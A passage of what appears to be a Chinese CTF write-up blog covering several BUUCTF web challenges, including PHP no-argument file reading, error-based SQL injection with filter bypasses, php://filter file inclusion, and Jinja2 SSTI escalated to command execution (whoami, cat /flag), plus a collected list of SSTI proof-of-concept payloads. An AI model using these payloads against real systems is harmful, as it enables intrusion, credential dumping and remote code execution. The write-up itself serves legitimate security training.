class="line">)</span><br></pre></td></tr></table></figure><br>看到了第一个就是.，所以这里用current()函数，来返回这个点</p>
<p>补充一下函数<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">current</span><span class="params">()</span></span> 返回数组中的当前单元, 默认取第一个值</span><br><span class="line"><span class="function"><span class="title">pos</span><span class="params">()</span></span> current() 的别名</span><br></pre></td></tr></table></figure></p>
<p>本地测试一下<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">print<span class="constructor">_r(<span class="params">current</span>(<span class="params">localeconv</span>()</span>));</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line">.</span><br></pre></td></tr></table></figure><br>发现成功得到了一个.</p>
<p>所以构造payload<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)));</span><br></pre></td></tr></table></figure><br>得到了<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; .git [<span class="number">3</span>] =&gt; flag.php [<span class="number">4</span>] =&gt; index.php )</span><br></pre></td></tr></table></figure><br>看到flag.php在第四个位置，想用next()函数套娃，得到flag.php,但是发现不可以，next()函数返回的是数组，不可以套娃</p>
<p>所以又想到了使用array_reverse()<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">array_reverse</span><span class="params">()</span></span> 函数返回翻转顺序的数组</span><br></pre></td></tr></table></figure><br>反过来之后，再next不就可以了</p>
<p>想用file_get_contents()函数，但是发现第三个if中ban掉了et，所以找他的替代函数<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">hightlight_file</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><br>这三个函数的意思都差不多，都是获取文件中的内容</p>
<p>构造payload<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?exp=highlight<span class="constructor">_file(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h3 id="函数整理"><a href="#函数整理" class="headerlink" title="函数整理"></a>函数整理</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">localeconv</span><span class="params">()</span></span> 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 列出 images 目录中的文件和目录。</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 输出一个文件。</span><br><span class="line"><span class="function"><span class="title">current</span><span class="params">()</span></span> 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="function"><span class="title">pos</span><span class="params">()</span></span> current() 的别名。</span><br><span class="line"><span class="function"><span class="title">next</span><span class="params">()</span></span> 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="function"><span class="title">array_reverse</span><span class="params">()</span></span>以相反的元素顺序返回数组。</span><br><span class="line"><span class="function"><span class="title">highlight_file</span><span class="params">()</span></span>打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure>
<p>看了WP之后，还发现有几个骚姿势</p>
<h2 id="姿势补充"><a href="#姿势补充" class="headerlink" title="姿势补充"></a>姿势补充</h2><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用array_flip()和array_rand()来随机读取<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">array_flip</span><span class="params">()</span></span>交换数组的键和值</span><br><span class="line"><span class="function"><span class="title">array_rand</span><span class="params">()</span></span>从数组中随机取出一个或多个单元</span><br></pre></td></tr></table></figure></p>
<p>payload<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?exp=highlight<span class="constructor">_file(<span class="params">array_rand</span>(<span class="params">array_flip</span>(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure><br>多刷新几次就可以得到flag了</p>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>使用session_id(session_start())</p>
<p>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p>
<p>因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php</p>
<p>[GXYCTF2019]禁止套娃0.png<br><img src="/img/Nepnep/[GXYCTF2019]禁止套娃0.png" alt="avatar"><br><img src="/img/Nepnep/[GXYCTF2019]禁止套娃1.png" alt="avatar"></p>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>还是一样的界面，尝试了一下万能密码和双写注入，发现都不行，经过手工验证发现过滤了空格，union，and,=等多个SQL关键字</p>
<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><p>·报错注入</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入常用updatexml()和extractvalue()来利用</p>
<p>例如<br><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">http:<span class="string">//localhost/sqli.php</span>?name=' or extractvalue<span class="params">(1,concat(user()</span>,0x7e,<span class="keyword">version</span><span class="params">()</span>)) <span class="comment"># &amp;pass=1</span></span><br><span class="line"></span><br><span class="line">http:<span class="string">//localhost/index.php</span>?name=' or updatexml<span class="params">(1,concat(user()</span>,0x7e,<span class="keyword">version</span><span class="params">()</span>),1) <span class="comment"># &amp;pass=1</span></span><br></pre></td></tr></table></figure></p>
<p>这个题目由于过滤了空格，但是可以将语句用（）括起来进行绕过空格</p>
<p>过滤了=，可以使用like来绕过<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LIKE</span>  操作符用于在 <span class="keyword">WHERE</span> 子句中搜索列中的指定模式</span><br></pre></td></tr></table></figure></p>
<p>由于限制了显示的长度，所以可以使用left()和right()函数来拼接flag</p>
<h2 id="测试过程-4"><a href="#测试过程-4" class="headerlink" title="测试过程"></a>测试过程</h2><p>先查看一下数据库,payload<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到了geek</p>
<p>爆表payload<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?username=<span class="keyword">admin</span>%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(<span class="built_in">table_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">tables</span>)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到了H4rDsq1</p>
<p>爆字段payload<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name)like(%<span class="number">27</span>H4rDsq1%<span class="number">27</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到了id,username,password</p>
<p>爆数据payload<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(username,password))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到了前半段flag</p>
<p>使用right()来获取后半段<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(right(password,<span class="number">30</span>)))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure></p>
<p>拼一下，得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Nepnep</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Nepnep-WEB-0</title>
    <url>/2020/05/08/BUUCTF-Nepnep-0/</url>
    <content><![CDATA[<p>这是加入Nepnep战队之后的第一次刷题记录,由于要求刷题记录5题一篇文章，所以在这里做出一个改变</p>
<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>打开环境之后，发现有个链接，点击一下<br><img src="/img/Nepnep/ACTF2020新生赛Include-0.png" alt="avatar"></p>
<p>点击之后得到这样一个界面，发现URL上有一个file变量，可以判断是使用伪协议来进行来进行文件的读取<br>所以先常规查看一下index.php的内容<br>pyload:<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><br>经过base64转码后得到index.php的代码：<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr(<span class="variable">$file</span>,<span class="string">"php://input"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"zip://"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"phar://"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"data:"</span>))&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>)&#123;</span><br><span class="line">	include(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	echo <span class="string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>这段代码还是很简单的，就是利用了stristr函数来对几个常见的伪协议进行搜索，如果搜索到使用了这几个伪协议那就判断为hacker!</p>
<p>类似于正则，但是没有正则灵活吧</p>
<p>这里分析看到并没有过滤php://filter，所以直接使用读取flag.php<br>pyload:<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><br>得到flag,属于送分题类型</p>
<h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题打开之后是个google搜索，随便在框内输入，然后点击搜索后，在页面看到了我输入的内容，发现没有什么东西，查看源码之后得到了提示：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--ssssssti &amp; a little trick --&gt;</span></span><br></pre></td></tr></table></figure><br>这里不知道是什么意思，在网上搜索了之后发现是ssti注入</p>
<p>我这里参考了这篇文章<br><a href="https://xz.aliyun.com/t/3679#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679#toc-9</a></p>
<p>造成模板注入的原因与一般注入相同，都是渲染的模板可以受用户控制且过分相信了用户的输入而造成了模板注入</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>类似于这样的模板：<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"> <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><span class="template-variable">&#123;$what&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>$what会接受用户输入的值，例如用户输入xxx，那么这个模板经过渲染后就会变为<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就是模板受用户控制</p>
<h3 id="jiajia2的基本语法"><a href="#jiajia2的基本语法" class="headerlink" title="jiajia2的基本语法"></a>jiajia2的基本语法</h3><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;config&#125;&#125;</span>可以获取当前设置</span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="keyword">self</span>&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="keyword">self</span>.__dict__._TemplateReference__context.config&#125;&#125;</span> 同样可以看到config</span><br><span class="line"><span class="template-variable">&#123;&#123;&#125;&#125;</span>为变量</span><br><span class="line">&#123;<span class="comment"># #&#125;为注释</span></span><br><span class="line"><span class="template-variable">&#123;% %&#125;</span>内可以写代码</span><br></pre></td></tr></table></figure>
<p>另外得知jiajia2貌似是基于flask框架的，所以再补充一下python的知识<br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="strong">__class__</span> 返回类型所属的对象</span><br><span class="line"><span class="strong">__subclasses__</span> 返回该对象所在类的子类</span><br><span class="line"><span class="strong">__init__</span> 类的初始化方法</span><br><span class="line"><span class="strong">__globals__</span> 对包含函数全局变量的字典的引用</span><br><span class="line"><span class="strong">__mro__</span> 返回该对象的所有类，包括父类</span><br><span class="line"><span class="strong">__bases__</span> 返回该对象所继承的基类 <span class="strong">__builtins__</span>是做为默认初始模块</span><br></pre></td></tr></table></figure><br>根据这些，以及参考的资料，首先对其进行测试</p>
<h2 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h2><p>pyload:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="number">2</span>*<span class="number">2</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/img/Nepnep/fakegoogle0.png" alt="avatar"></p>
<p>验证了存在ssti注入<br>首先使用()配合空字符串，加上<strong>class</strong>来查看类<br><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">qaq?<span class="built_in">name</span>=&#123;&#123;().<span class="variable">__class__</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>得到class ‘tuple’，成功之后在使用_bases_来查看继承的基类<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>&#125;</span></span>&#125;</span><br></pre></td></tr></table></figure><br>得到确实是所有类的父类<class 'object'></p>
<p>接下来选中object类，并且使用subclasses返回它的所有子类</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>列出了所有子类,这里要找的是OS所在的warnings.catch_warnings类<br>发现在170个，索引就为169<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">169</span>]</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>选中后初始化这个类,并使用globals全局查看里面的方法<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">169</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span><span class="module"><span class="identifier">__globals__</span>&#125;</span></span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>在这些方法中找到eval,并进行创建<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">169</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span><span class="module"><span class="identifier">__globals__</span>.</span><span class="module"><span class="identifier">__builtins__</span>[</span></span>%<span class="number">27</span>eval%<span class="number">27</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><br>接下来import OS ,并执行whoami命令查看是否可以运行<br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">169</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">%27eval%27</span>](<span class="link">"__import__(%27os%27</span>).popen(%27whoami%27).read()")&#125;&#125;</span><br></pre></td></tr></table></figure><br>得到了ctf，证明可以正常运行，接下来就cat /flag<br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">169</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">%27eval%27</span>](<span class="link">"__import__(%27os%27</span>).popen(%27cat%20/flag%27).read()")&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>成功得到了flag</p>
<h2 id="SSTI注入-POC收藏"><a href="#SSTI注入-POC收藏" class="headerlink" title="SSTI注入-POC收藏"></a>SSTI注入-POC收藏</h2><p>另外还在网上看到了很多POC 这里收藏一下<br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">第二种</span><br><span class="line">或者找到os.<span class="emphasis">_wrap_</span>close模块 117个</span><br><span class="line">&#123;&#123;"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'dir'</span>).read()&#125;&#125;  </span><br><span class="line">当前文件夹</span><br><span class="line">&#123;&#123;"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'cat /flag'</span>).read()&#125;&#125;</span><br><span class="line">来打开文件，payload有很多慢慢摸索慢慢积累= =</span><br></pre></td></tr></table></figure><br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">第三种</span><br><span class="line">&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">第四种</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__=='catch_warnings' %&#125;</span><span class="template-variable">&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__=='catch_warnings' %&#125;</span><span class="template-variable">&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>打开之后看到源码<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    echo <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        echo <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        echo <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>可以看到需要text file和password三个参数满足条件，才会输出flag</p>
<p>先分析一下text参数<br>text参数先判断了是否存在，如果存在则使用file_get_contents($text,’r’)</p>
<p>查阅了一下百度，file_get_contents() 是把文件读入一个字符串，所以可得知，需要将welcome to the zjctf输入到文件中，然后进行查询，才能满足条件</p>
<p>file则是需要包含useless.php</p>
<p>password则是需要进行反序列化操作</p>
<p>所以先想到使用伪协议来将welcome to the zjctf读入到文件中，然后再使用伪协议读取useless.php的内容，猜测useless.php中的内容就是password需要的反序列化内容</p>
<p>这里伪协议做一个补充</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><h3 id="PHP支持的伪协议"><a href="#PHP支持的伪协议" class="headerlink" title="PHP支持的伪协议"></a>PHP支持的伪协议</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// — 压缩流</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// — 音频流</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
<p>常用的伪协议：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>  <span class="comment"> //经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.</span></span><br><span class="line">可以跟的参数有resource=&lt;要过滤的数据流&gt;  <span class="built_in">read</span>=&lt;读链的筛选列表&gt;  <span class="built_in">write</span>=&lt;写链的筛选列表&gt;</span><br><span class="line">常用语句：php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php  <span class="built_in">read</span>/<span class="built_in">write</span>参数替换<span class="built_in">read</span>的位置即可  resource为必须的参数</span><br><span class="line"></span><br><span class="line">php://input  <span class="comment"> //php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">file</span>://   <span class="comment"> //file://伪协议在双OFF的时候也可以用，用于本地文件包含  file://协议必须是绝对路径</span></span><br><span class="line"></span><br><span class="line">phar://  <span class="comment"> //说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关  </span></span><br><span class="line">常用语句：phar://test.[zip/jpg/png…]/<span class="built_in">file</span>.txt</span><br><span class="line"></span><br><span class="line">data://<span class="keyword">text</span>/plain;base64,base编码字符串   <span class="comment"> //很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</span></span><br></pre></td></tr></table></figure></p>
<h2 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h2><p>这里有两种方法  一种是使用php://input，但是需要在POST请求下进行，比较繁琐，所以我这里采用了data协议</p>
<p>pyload:<br><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure></p>
<p>接着看到<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        echo <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        echo <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>看到了include  并且提示了useless.php 所以考虑使用文件包含，用PHP://filter来读取<br>pyload:<br><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain;<span class="built_in">base64</span>,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.<span class="built_in">base64</span>-encode/resource=useless.php</span><br></pre></td></tr></table></figure></p>
